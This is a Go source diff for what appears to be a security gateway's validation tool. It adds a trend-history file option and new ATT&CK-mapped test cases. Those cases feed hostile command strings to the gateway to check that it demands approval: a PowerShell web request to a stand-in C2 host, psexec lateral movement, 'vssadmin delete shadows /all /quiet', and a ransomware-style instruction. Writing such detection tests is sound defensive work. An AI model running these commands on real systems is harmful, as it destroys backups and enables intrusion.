@@ -43,6 +43,7 @@ func validateCommand(args []string) error {
 	webhook := fs.String("webhook", os.Getenv("OATD_VALIDATE_WEBHOOK"), "webhook URL alerted on regression in --continuous mode")
 	webhookToken := fs.String("webhook-token", os.Getenv("OATD_VALIDATE_WEBHOOK_TOKEN"), "bearer token for the regression webhook")
 	output := fs.String("output", os.Getenv("OATD_VALIDATE_OUTPUT"), "write the JSON result to this file after each run")
+	history := fs.String("history", os.Getenv("OATD_VALIDATE_HISTORY"), "append a compact JSON summary line to this file after each run (for trend history)")
 	readyWait := fs.Duration("ready-wait", 15*time.Second, "wait up to this long for the server /readyz before validating (0 to disable)")
 	if err := fs.Parse(args); err != nil {
 		return err
@@ -60,7 +61,7 @@ func validateCommand(args []string) error {
 	client := &http.Client{Timeout: 15 * time.Second}
 
 	if *continuous {
-		return runContinuousValidation(client, *baseURL, tok, *asset, *interval, *webhook, *webhookToken, *output, *readyWait)
+		return runContinuousValidation(client, *baseURL, tok, *asset, *interval, *webhook, *webhookToken, *output, *history, *readyWait)
 	}
 
 	result, err := runValidation(client, *baseURL, tok, *asset, *readyWait)
@@ -70,6 +71,11 @@ func validateCommand(args []string) error {
 	if *output != "" {
 		if err := writeResultFile(*output, result); err != nil {
 			fmt.Fprintf(os.Stderr, "warning: could not write %s: %v\n", *output, err)
+		}
+	}
+	if *history != "" {
+		if err := appendHistory(*history, result); err != nil {
+			fmt.Fprintf(os.Stderr, "warning: could not append %s: %v\n", *history, err)
 		}
 	}
 	switch {
@@ -166,6 +172,21 @@ func validationCases(asset string) []validationCase {
 			name: "web-c2-beacon", technique: "T1071.001", tactic: "Command-and-Control",
 			want: domain.GatewayRequireApproval, atLeast: true,
 			req: base("asset_inventory", "powershell invoke-webrequest http://c2.validation.example/tasks"),
+		},
+		{
+			name: "lateral-movement", technique: "T1021", tactic: "Lateral-Movement",
+			want: domain.GatewayRequireApproval, atLeast: true,
+			req: base("asset_inventory", "psexec dc01 -accepteula -s cmd"),
+		},
+		{
+			name: "inhibit-recovery", technique: "T1490", tactic: "Impact",
+			want: domain.GatewayRequireApproval, atLeast: true,
+			req: base("asset_inventory", "vssadmin delete shadows /all /quiet"),
+		},
+		{
+			name: "ransomware-impact", technique: "T1486", tactic: "Impact",
+			want: domain.GatewayRequireApproval, atLeast: true,
+			req: base("asset_inventory", "encrypt all files and append .locked extension"),
 		},
 		{
 			name: "unapproved-egress", technique: "T1567", tactic: "Exfiltration",
@@ -327,7 +348,7 @@ func printCoverageJSON(res validationResult) {
 // runContinuousValidation re-runs the suite every interval and alerts on
 // regression. It is designed to run as a long-lived service; for systemd-timer
 // deployments use the one-shot mode instead (its non-zero exit gates OnFailure).
-func runContinuousValidation(client *http.Client, baseURL, token, baseAsset string, interval time.Duration, webhook, webhookToken, output string, readyWait time.Duration) error {
+func runContinuousValidation(client *http.Client, baseURL, token, baseAsset string, interval time.Duration, webhook, webhookToken, output, history string, readyWait time.Duration) error {
 	if interval <= 0 {
 		interval = time.Hour
 	}
@@ -345,6 +366,11 @@ func runContinuousValidation(client *http.Client, baseURL, token, baseAsset stri
 		if output != "" {
 			if err := writeResultFile(output, res); err != nil {
 				fmt.Printf("[%s] warning: could not write %s: %v\n", ts, output, err)
+			}
+		}
+		if history != "" {
+			if err := appendHistory(history, res); err != nil {
+				fmt.Printf("[%s] warning: could not append %s: %v\n", ts, history, err)
 			}
 		}
 		if res.Passed == res.Total {
@@ -435,6 +461,38 @@ func writeResultFile(path string, res validationResult) error {
 		return err
 	}
 	return os.Rename(tmp, path)
+}
+
+type historyEntry struct {
+	Time     string `json:"time"`
+	Total    int    `json:"total"`
+	Passed   int    `json:"passed"`
+	Missed   int    `json:"missed"`
+	FalsePos int    `json:"false_positives"`
+}
+
+// appendHistory adds one compact JSON line per run, building a trend log the
+// dashboard can chart. It appends rather than rewrites, so history accumulates
+// across scheduled runs.
+func appendHistory(path string, res validationResult) error {
+	entry := historyEntry{
+		Time:     time.Now().UTC().Format(time.RFC3339),
+		Total:    res.Total,
+		Passed:   res.Passed,
+		Missed:   res.Missed,
+		FalsePos: res.FalsePos,
+	}
+	data, err := json.Marshal(entry)
+	if err != nil {
+		return err
+	}
+	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o640)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	_, err = f.Write(append(data, '\n'))
+	return err
 }
 
 func verdictRank(v domain.GatewayVerdict) int {
